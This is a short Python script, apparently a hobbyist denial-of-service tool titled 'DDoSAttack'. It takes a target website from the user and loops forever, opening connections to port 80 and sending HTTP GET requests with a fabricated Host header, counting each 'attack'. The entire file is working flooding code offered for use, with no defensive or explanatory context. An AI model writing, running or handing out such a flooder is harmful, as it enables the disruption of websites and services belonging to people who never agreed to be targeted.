import socket
import pyfiglet
#############
Y = '\033[1;33m'
R = '\033[1;31m'
B = '\033[2;34m'
G = '\033[2;32m'
#############
logo = pyfiglet.figlet_format("DDoSAttack")
print(R + logo)
target = input(G + "Enter website: ")  # Replace with the target domain or IP address
port = 80  # Replace with the target port
fake_ip = "10.0.0.1"  # Replace with a fake IP address

attack_num = 0

def attack():
    global attack_num
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        attack_num += 1
        print(f"Attack {attack_num}")
        s.close()

attack()
